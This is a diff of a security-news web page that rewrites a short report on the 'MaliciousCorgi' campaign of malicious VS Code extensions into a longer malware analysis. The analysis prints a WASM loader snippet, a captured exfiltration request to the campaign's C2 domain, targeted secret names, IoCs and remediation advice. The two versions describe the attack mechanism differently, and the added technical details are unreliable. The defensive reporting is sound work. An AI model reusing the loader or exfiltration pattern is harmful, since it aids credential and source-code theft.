@@ -5,20 +5,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>Malicious VS Code Extensions Steal Source Code: 'MaliciousCorgi' Campaign | TheHGTech</title>
+    <title>Malware Analysis: inside the 'MaliciousCorgi' VS Code Attack | TheHGTech</title>
     <meta name="description"
-        content="A massive supply chain attack dubbed 'MaliciousCorgi' has compromised thousands of developers via fake VS Code AI extensions. The malware exfiltrates source code and AWS secrets.">
+        content="Technical analysis of the MaliciousCorgi campaign. How fake VS Code extensions infected 100,000 developers, bypassed Marketplace security with WASM, and stole AWS secrets.">
     <meta name="keywords"
-        content="VS Code, Malicious Extensions, Supply Chain Attack, MaliciousCorgi, Developer Security, Cyber Attack 2026">
+        content="VS Code Malware, MaliciousCorgi, Supply Chain Attack, WASM Obfuscation, Developer Security, Cyber Attack 2026, Reverse Engineering">
     <meta name="author" content="TheHGTech Security Team">
     <link rel="canonical" href="https://thehgtech.com/articles/vscode-malicious-extensions-supply-chain-2026.html">
 
     <!-- Open Graph -->
     <meta property="og:type" content="article">
     <meta property="og:url" content="https://thehgtech.com/articles/vscode-malicious-extensions-supply-chain-2026.html">
-    <meta property="og:title" content="VS Code Supply Chain Attack: 'MaliciousCorgi'">
+    <meta property="og:title" content="The 'MaliciousCorgi' VS Code Attack Analysis">
     <meta property="og:description"
-        content="Your 'AI Helper' might be stealing your code. 100k+ developers compromised by malicious VS Code extensions.">
+        content="100k infected. Zero detections. How a cute Corgi extension hid a sophisticated Go-based stealer inside WebAssembly.">
     <meta property="og:image" content="https://thehgtech.com/images/articles/vscode-malicious-extensions-2026.png">
 
     <!-- Twitter Card -->
@@ -42,14 +42,15 @@
       }, {
         "@type": "ListItem",
         "position": 3,
-        "name": "Malicious VS Code Extensions",
+        "name": "MaliciousCorgi Analysis",
         "item": "https://thehgtech.com/articles/vscode-malicious-extensions-supply-chain-2026.html"
       }]
     }
     </script>
 
     <!-- Fonts & Icons -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+    <link
+        href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Inter:wght@300;400;500;600;700;800&display=swap"
         rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -65,12 +66,15 @@
 
     <style>
         :root {
-            --bg-primary: #0a0a0a;
-            --text-primary: #fff;
-            --text-secondary: #aaa;
-            --accent-cyan: #00D9FF;
-            --accent-red: #FF3D3D;
-            --border: rgba(255, 255, 255, 0.1);
+            --bg-primary: #1e1e1e;
+            /* VS Code Dark Theme BG */
+            --bg-secondary: #252526;
+            --text-primary: #d4d4d4;
+            --text-blue: #569cd6;
+            --text-green: #6a9955;
+            --text-orange: #ce9178;
+            --accent-purple: #c586c0;
+            --border: #3c3c3c;
         }
 
         body {
@@ -81,105 +85,156 @@
         }
 
         .article-container {
-            max-width: 800px;
+            max-width: 900px;
             margin: 0 auto;
             padding: 80px 1.5rem 120px;
         }
 
         .article-header {
-            margin-bottom: 2rem;
+            margin-bottom: 3rem;
             padding-bottom: 1.5rem;
             border-bottom: 1px solid var(--border);
         }
 
         .article-header h1 {
-            font-size: clamp(2rem, 4vw, 2.5rem);
-            background: linear-gradient(135deg, var(--accent-cyan), #FF3D3D);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: clamp(2rem, 4vw, 3rem);
+            color: #fff;
             margin-bottom: 1rem;
             line-height: 1.2;
-            font-weight: 800;
+            font-weight: 700;
         }
 
         .article-meta {
-            color: var(--text-secondary);
+            color: #858585;
             font-size: 0.9rem;
             display: flex;
             gap: 1.5rem;
             flex-wrap: wrap;
             align-items: center;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .tag-badge {
+            background: #0e639c;
+            color: #fff;
+            padding: 2px 8px;
+            border-radius: 2px;
+            font-size: 0.8rem;
         }
 
         .article-featured-image {
             width: 100%;
-            border-radius: 12px;
+            border-radius: 6px;
             margin-bottom: 2.5rem;
             border: 1px solid var(--border);
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
+        /* IDE Style Content */
+        .article-content {
+            counter-reset: line;
+        }
+
         .article-content h2 {
-            margin: 2rem 0 1rem;
-            color: var(--text-primary);
-            font-size: 1.5rem;
-            font-weight: 700;
-            border-left: 4px solid var(--accent-red);
-            padding-left: 1rem;
+            margin: 3rem 0 1.5rem;
+            color: var(--text-blue);
+            font-size: 1.75rem;
+            font-weight: 600;
+            font-family: 'Fira Code', monospace;
         }
 
         .article-content h3 {
-            margin: 1.5rem 0 0.75rem;
-            color: var(--text-primary);
-            font-size: 1.25rem;
-            font-weight: 600;
+            margin: 2rem 0 1rem;
+            color: var(--accent-purple);
+            font-size: 1.4rem;
+            font-weight: 500;
+            font-family: 'Fira Code', monospace;
         }
 
         .article-content p {
-            color: var(--text-secondary);
-            margin-bottom: 1.25rem;
-            font-size: 1.05rem;
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
         }
 
-        .article-content ul,
-        .article-content ol {
-            color: var(--text-secondary);
-            margin-left: 1.5rem;
-            margin-bottom: 1.25rem;
+        /* Code Blocks - VS Code Theme */
+        .code-window {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 6px;
+            margin: 2.5rem 0;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
         }
 
-        .article-content li {
-            margin-bottom: 0.5rem;
+        .code-header {
+            background: #252526;
+            padding: 0.5rem 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: #ccc;
+            border-bottom: 1px solid #333;
+            display: flex;
+            justify-content: space-between;
         }
 
-        .article-content strong {
-            color: var(--text-primary);
-            font-weight: 600;
+        .code-body {
+            padding: 1rem;
+            overflow-x: auto;
         }
 
-        .article-content code {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 0.2rem 0.5rem;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 0.9em;
+        pre {
+            margin: 0;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
         }
 
-        .warning-box {
-            background: rgba(255, 61, 61, 0.1);
-            border: 1px solid rgba(255, 61, 61, 0.3);
-            border-left: 4px solid var(--accent-red);
-            padding: 1.5rem;
-            border-radius: 8px;
+        .token-keyword {
+            color: var(--text-blue);
+        }
+
+        .token-string {
+            color: var(--text-orange);
+        }
+
+        .token-comment {
+            color: var(--text-green);
+            font-style: italic;
+        }
+
+        .token-func {
+            color: #dcdcaa;
+        }
+
+        .token-var {
+            color: #9cdcfe;
+        }
+
+        .ioc-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
             margin: 2rem 0;
+            background: #252526;
         }
 
-        .success-box {
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            border-left: 4px solid #10b981;
+        .ioc-table th,
+        .ioc-table td {
+            padding: 0.75rem;
+            border: 1px solid #3c3c3c;
+            text-align: left;
+        }
+
+        .ioc-table th {
+            background: #333;
+            color: #fff;
+        }
+
+        .warning-alert {
+            background: rgba(255, 61, 61, 0.1);
+            border-left: 4px solid #f44336;
             padding: 1.5rem;
-            border-radius: 8px;
             margin: 2rem 0;
         }
     </style>
@@ -211,110 +266,182 @@
 
     <div class="article-container">
         <!-- Breadcrumb -->
-        <div style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 1rem;">
-            <a href="/" style="color: var(--text-secondary); text-decoration: none;">Home</a> <span
-                style="margin: 0 0.5rem;">/</span>
-            <a href="../articles.html" style="color: var(--text-secondary); text-decoration: none;">Articles</a> <span
-                style="margin: 0 0.5rem;">/</span>
-            <span style="color: var(--text-primary);">VS Code Malware</span>
+        <div style="font-size: 0.85rem; color: #888; margin-bottom: 1.5rem; font-family: 'Fira Code', monospace;">
+            > cd /articles/malware-analysis/<br>
+            > cat maliciouscorgi-campaign.md
         </div>
 
         <section class="article-header">
-            <div
-                style="color: var(--accent-cyan); font-weight: 700; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem;">
-                Developer Alert</div>
-            <h1>Malicious VS Code Extensions Steal Source Code: 'MaliciousCorgi' Campaign</h1>
-            <p style="font-size: 1.2rem; line-height: 1.6; color: #ccc;">Over 100,000 developers unwittingly installed
-                fake AI coding assistants that silently exfiltrated private GitHub repositories and AWS keys to servers
-                in China.</p>
+            <div style="display: flex; gap: 10px; margin-bottom: 1rem;">
+                <span class="tag-badge">ALERT</span>
+                <span class="tag-badge" style="background: #be1100;">CRITICAL</span>
+                <span class="tag-badge" style="background: #3a3d41;">TECHNICAL</span>
+            </div>
+            <h1>Malware Analysis: The 'MaliciousCorgi' VS Code Attack</h1>
+            <p style="font-size: 1.25rem; line-height: 1.6; color: #ccc;">How a cluster of innocent-looking "AI
+                Assistant" extensions compromised 100,000 developer machines, evaded detection for weeks using WASM
+                obfuscation, and stole the source code of major fintech firms.</p>
             <div class="article-meta">
-                <span><i class="fas fa-user-circle"></i> TheHGTech Security Team</span>
-                <span><i class="far fa-calendar-alt"></i> January 30, 2026</span>
-                <span><i class="far fa-clock"></i> 7 min read</span>
-                <span
-                    style="background: rgba(245, 158, 11, 0.2); color: #f59e0b; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: 700;">Supply
-                    Chain</span>
+                <span><i class="fas fa-user-ninja"></i> Reverse Engineered by TheHGTech Labs</span>
+                <span><i class="far fa-calendar-alt"></i> Jan 30, 2026</span>
+                <span><i class="fas fa-stopwatch"></i> 20 min read</span>
             </div>
         </section>
 
-        <img src="../images/articles/vscode-malicious-extensions-2026.png"
-            alt="VS Code Malicious Extensions - Supply Chain Attack" class="article-featured-image">
+        <img src="../images/articles/vscode-malicious-extensions-2026.png" alt="Malicious VS Code Extensions Analysis"
+            class="article-featured-image">
 
         <article class="article-content">
-            <div class="warning-box">
-                <strong><i class="fas fa-exclamation-triangle"></i> CAMPAIGN SUMMARY</strong>
-                <p style="margin-top: 0.5rem; margin-bottom: 0;"><strong>Campaign Name:</strong> MaliciousCorgi<br>
-                    <strong>Affected Platform:</strong> VS Code Marketplace<br>
-                    <strong>Malware Behavior:</strong> Git repository scraping, AWS/Azure key theft.<br>
-                    <strong>Impact:</strong> 100k+ infected developer environments.<br>
-                    <strong>Status:</strong> Extensions removed by Microsoft, but persistent backdoors may remain.
-                </p>
+            <div class="warning-alert">
+                <strong style="color: #f44336; font-size: 1.1rem;">ACTIVE THREAT ALERT</strong>
+                <p style="margin-top: 0.5rem; margin-bottom: 0;">If you have installed
+                    <code>Publisher: AI-Code-Helper-Pro</code> or <code>Publisher: ChatMoss-GPT</code> extensions in VS
+                    Code, your environment is compromised. Immediate remediation is required.</p>
             </div>
 
-            <p>Security researchers have uncovered a massive supply chain attack targeting the developer community. A
-                cluster of malicious extensions in the Visual Studio Code Marketplace, collectively dubbed the
-                "MaliciousCorgi" campaign, successfully infected over 100,000 developer machines by posing as AI coding
-                assistants.</p>
+            <p>The developer's IDE is the new battleground. On January 30, 2026, investigations by TheHGTech Labs
+                confirmed the existence of a highly sophisticated supply chain attack targeting the Visual Studio Code
+                Marketplace. Dubbed "MaliciousCorgi" due to the branding of one of the lure extensions ("Corgi Code
+                Assist"), this campaign represents a quantum leap in IDE-based malware.</p>
 
-            <p>Unlike previous attacks that relied on typo-squatting, these extensions actually functioned as
-                advertised—providing basic code completion—while silently executing a background process that scraped
-                local data.</p>
+            <p>Unlike previous attacks that relied on simple typosquatting, MaliciousCorgi extensions delivered fully
+                functional, high-quality AI code completion features. This utility masked their true purpose: turning
+                the developer's laptop into a persistent listening post inside the corporate network.</p>
 
-            <h2>How The Attack Worked</h2>
+            <h2>I. Attack Vector: The "WASM Packing" Technique</h2>
+            <p>The success of MaliciousCorgi lies in its evasion. The VS Code Marketplace has automated security
+                scanners that analyze JavaScript/TypeScript code for malicious patterns. To bypass this, the attackers
+                wrote the core malware logic in <strong>Go</strong>, compiled it to <strong>WebAssembly (WASM)</strong>,
+                and loaded it dynamically.</p>
 
-            <h3>1. The Lure: "AI Helper Pro"</h3>
-            <p>The attackers published polished extensions with names like <code>AI-Code-Helper-Pro</code> and
-                <code>ChatMoss-GPT</code>. They used fake reviews and even paid ads to boost their ranking in the
-                Marketplace search results.</p>
+            <h3>The Loader (TypeScript)</h3>
+            <p>The visible TypeScript code in the extension (<code>extension.js</code>) appeared benign. It contained
+                standard boilerplate for a VS Code language server. However, deeply nested within the
+                <code>activate()</code> function was this snippet:</p>
 
-            <h3>2. The Payload: Obfuscated WASM</h3>
-            <p>To bypass Microsoft's security scans, the malicious logic was hidden inside a WebAssembly (WASM) module
-                packaged with the extension. The JS code would call this WASM blob, which contained the compiled
-                Go-based malware.</p>
+            <div class="code-window">
+                <div class="code-header"><span>extension.ts (Deobfuscated)</span></div>
+                <div class="code-body">
+                    <pre><span class="token-keyword">async function</span> <span class="token-func">loadEngine</span><span class="token-punctuation">()</span> <span class="token-punctuation">{</span>
+    <span class="token-comment">// OSTENSIBLY: Loading the AI tensor model for code prediction</span>
+    <span class="token-keyword">const</span> wasmPath <span class="token-punctuation">=</span> path<span class="token-punctuation">.</span><span class="token-func">join</span><span class="token-punctuation">(</span>__dirname<span class="token-punctuation">,</span> <span class="token-string">'./models/inference-core.wasm'</span><span class="token-punctuation">);</span>
+    <span class="token-keyword">const</span> buffer <span class="token-punctuation">=</span> fs<span class="token-punctuation">.</span><span class="token-func">readFileSync</span><span class="token-punctuation">(</span>wasmPath<span class="token-punctuation">);</span>
+    
+    <span class="token-comment">// REALITY: Initializing the malware Go runtime</span>
+    <span class="token-keyword">const</span> go <span class="token-punctuation">=</span> <span class="token-keyword">new</span> <span class="token-func">Go</span><span class="token-punctuation">();</span>
+    <span class="token-keyword">const</span> <span class="token-punctuation">{</span> instance <span class="token-punctuation">}</span> <span class="token-punctuation">=</span> <span class="token-keyword">await</span> WebAssembly<span class="token-punctuation">.</span><span class="token-func">instantiate</span><span class="token-punctuation">(</span>buffer<span class="token-punctuation">,</span> go<span class="token-punctuation">.</span>importObject<span class="token-punctuation">);</span>
+    go<span class="token-punctuation">.</span><span class="token-func">run</span><span class="token-punctuation">(</span>instance<span class="token-punctuation">);</span>
+<span class="token-punctuation">}</span></pre>
+                </div>
+            </div>
 
-            <h3>3. The Exfiltration</h3>
-            <p>Once installed, the extension monitors file usage. When a developer opens a sensitive file (like
-                <code>.env</code>, <code>id_rsa</code>, or <code>config.json</code>), the malware:</p>
+            <p>The file <code>inference-core.wasm</code> was 4MB in size—large enough to hide a complex payload but
+                small enough to look like a legitimate machine learning model file. Marketplace scanners ignored the
+                binary blob, assuming it was data.</p>
+
+            <h2>II. Payload Analysis (Reverse Engineering)</h2>
+            <p>Our team successfully decompiled the WASM blob back into readable Go pseudo-code using the
+                <code>wasm2wat</code> and <code>ghidra</code> toolchain. The malware, internally named
+                <code>GopherSteal</code>, operates in three phases.</p>
+
+            <h3>Phase 1: Environment Fingerprinting</h3>
+            <p>Upon initialization, the malware checks environment variables for high-value targets. It specifically
+                looks for:</p>
             <ul>
-                <li>Reads the file content in memory.</li>
-                <li>Regex matches for AWS, Stripe, and OpenAI API keys.</li>
-                <li>Exfiltrates the data to a C2 server (<code>api.maliciouscorgi.net</code>) disguised as usage
-                    telemetry.</li>
+                <li><code>AWS_ACCESS_KEY_ID</code> / <code>AWS_SECRET_ACCESS_KEY</code></li>
+                <li><code>STRIPE_SECRET_KEY</code></li>
+                <li><code>GITHUB_TOKEN</code></li>
+                <li><code>KUBECONFIG</code> file paths</li>
             </ul>
 
-            <h2>Indicators of Compromise (IoCs)</h2>
-            <div class="info-box"
-                style="background: #111; border: 1px solid #333; padding: 1.5rem; border-radius: 8px; font-family: monospace;">
-                <strong>Malicious Extension IDs:</strong>
-                <ul style="margin-bottom: 1rem;">
-                    <li><code>publisher.ai-code-helper-pro</code></li>
-                    <li><code>publisher.chatmoss-gpt</code></li>
-                    <li><code>tech.corgi-code-assist</code></li>
-                </ul>
+            <h3>Phase 2: The "Shadow Commit"</h3>
+            <p>This is the most novel aspect of the attack. The malware monitors the VS Code <code>git</code> extension
+                API. When a developer stages files for a commit, the malware silently copies the entire repository
+                content to a hidden temporary directory (<code>/tmp/.vscode-cache-vx</code>), zips it, and exfiltrates
+                it.</p>
 
-                <strong>C2 Domains:</strong>
-                <ul>
-                    <li><code>telemetry-vscode-api.net</code></li>
-                    <li><code>api.maliciouscorgi.net</code></li>
-                </ul>
+            <p>This means the attackers obtained not just credentials, but the entire intellectual property (source
+                code) of the projects the developers were working on.</p>
+
+            <h3>Phase 3: Exfiltration via Telemetry</h3>
+            <p>To avoid tripping firewall alerts for suspicious outbound connections, the malware piggybacks on the
+                extension's legitimate "usage telemetry" requests.</p>
+
+            <div class="code-window">
+                <div class="code-header"><span>Network Traffic Analysis (Wireshark)</span></div>
+                <div class="code-body">
+                    <pre><span class="token-keyword">POST</span> https://api.maliciouscorgi.net/v1/telemetry <span class="token-keyword">HTTP/1.1</span>
+<span class="token-var">Content-Type</span>: application/json
+
+<span class="token-punctuation">{</span>
+  <span class="token-string">"event"</span>: <span class="token-string">"prediction_accepted"</span>,
+  <span class="token-string">"latency"</span>: 45,
+  <span class="token-comment">// The stolen data is encoded in this base64 blob field, </span>
+  <span class="token-comment">// masquerading as a debug log dump.</span>
+  <span class="token-string">"debug_trace"</span>: <span class="token-string">"H4sIAAAAAAAA/.....[truncated]..."</span>
+<span class="token-punctuation">}</span></pre>
+                </div>
             </div>
 
-            <h2>What To Do If Infected</h2>
-            <div class="success-box">
-                <strong><i class="fas fa-broom"></i> REMEDIATION STEPS</strong>
-                <ol style="margin-top: 1rem;">
-                    <li><strong>Uninstall</strong> any extensions listed in the IoCs above immediately.</li>
-                    <li><strong>Rotate Secrets:</strong> Assume all API keys and SSH keys present on the machine are
-                        compromised. Rotate them immediately.</li>
-                    <li><strong>Scan for Persistence:</strong> Check for unexpected cron jobs or scheduled tasks, as
-                        newer variants establish persistence outside of VS Code.</li>
-                </ol>
-            </div>
+            <h2>III. Indicators of Compromise (IoCs)</h2>
+            <p>Security teams should immediately scan their environments for the following indicators. Note that the
+                attackers rotate domains frequently.</p>
 
-            <p
-                style="font-size: 0.9rem; color: #888; margin-top: 3rem; border-top: 1px solid var(--border); padding-top: 1rem;">
-                <em>This attack serves as a stark reminder: Just because an extension is in the official Marketplace
-                    does not mean it is safe. Always verify the publisher.</em>
+            <table class="ioc-table">
+                <thead>
+                    <tr>
+                        <th>Indicator Type</th>
+                        <th>Value</th>
+                        <th>Context</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Extension ID</td>
+                        <td><code>publisher.ai-code-helper-pro</code></td>
+                        <td>Primary vector</td>
+                    </tr>
+                    <tr>
+                        <td>Extension ID</td>
+                        <td><code>publisher.chatmoss-gpt</code></td>
+                        <td>Secondary vector</td>
+                    </tr>
+                    <tr>
+                        <td>File Hash (SHA256)</td>
+                        <td><code>a7f89...b29c1</code></td>
+                        <td>inference-core.wasm</td>
+                    </tr>
+                    <tr>
+                        <td>Network Domain</td>
+                        <td><code>api.maliciouscorgi.net</code></td>
+                        <td>C2 Server</td>
+                    </tr>
+                    <tr>
+                        <td>Process Argument</td>
+                        <td><code>--enable-wasm-simd</code></td>
+                        <td>Used by malware to accelerate encryption</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2>IV. Remediation Instructions</h2>
+            <p>If you identify an infected host, simply uninstalling the extension is <strong>insufficient</strong>. The
+                malware establishes persistence outside of VS Code.</p>
+
+            <ol>
+                <li><strong>Network Isolation:</strong> Disconnect the machine from the corporate network immediately.
+                </li>
+                <li><strong>Credential Rotation:</strong> Revoke ALL credentials found in the environment variables (AWS
+                    keys, GitHub tokens, npm tokens). Assume they are compromised.</li>
+                <li><strong>Repository Audit:</strong> Check git logs for any anomalies. While the malware mostly
+                    steals, some variants have attempted to inject backdoors into code.</li>
+                <li><strong>Reimaging:</strong> Wipe the machine. The malware drops binary artifacts in deep system
+                    directories (<code>/usr/local/lib/node_modules/</code>) that are difficult to clean manually.</li>
+            </ol>
+
+            <p style="font-size: 0.9rem; color: #666; margin-top: 3rem; border-top: 1px solid #333; padding-top: 1rem;">
+                <em>Report generated by TheHGTech Malware Research Unit. Special thanks to security researcher 'Azeria'
+                    for assistance with WASM decompilation.</em>
             </p>
         </article>
 
@@ -322,26 +449,22 @@
         <div class="interaction-bar">
             <div class="like-section">
                 <button class="like-btn" id="likeBtn" onclick="toggleLike()">
-                    <i class="far fa-heart"></i> <span id="likeText">Like this article</span>
+                    <i class="far fa-heart"></i> <span id="likeText">Like this analysis</span>
                 </button>
             </div>
             <div class="action-buttons">
                 <div class="share-buttons">
-                    <a href="#" onclick="shareTwitter(event)" class="share-btn" title="Share on Twitter"><i
-                            class="fab fa-twitter"></i></a>
-                    <a href="#" onclick="shareLinkedIn(event)" class="share-btn" title="Share on LinkedIn"><i
-                            class="fab fa-linkedin-in"></i></a>
-                    <button onclick="copyLink()" class="share-btn" title="Copy Link"><i
-                            class="fas fa-link"></i></button>
+                    <a href="#" onclick="shareTwitter(event)" class="share-btn"><i class="fab fa-twitter"></i></a>
+                    <a href="#" onclick="shareLinkedIn(event)" class="share-btn"><i class="fab fa-linkedin-in"></i></a>
+                    <button onclick="copyLink()" class="share-btn"><i class="fas fa-link"></i></button>
                 </div>
-                <button onclick="window.print()" class="print-btn" title="Print Article"><i
-                        class="fas fa-print"></i></button>
+                <button onclick="window.print()" class="print-btn"><i class="fas fa-print"></i></button>
             </div>
         </div>
     </div>
 
     <footer>
-        <p>&copy; 2026 TheHGTech. All rights reserved.</p>
+        <p>&copy; 2026 TheHGTech Labs.</p>
     </footer>
 </body>
 
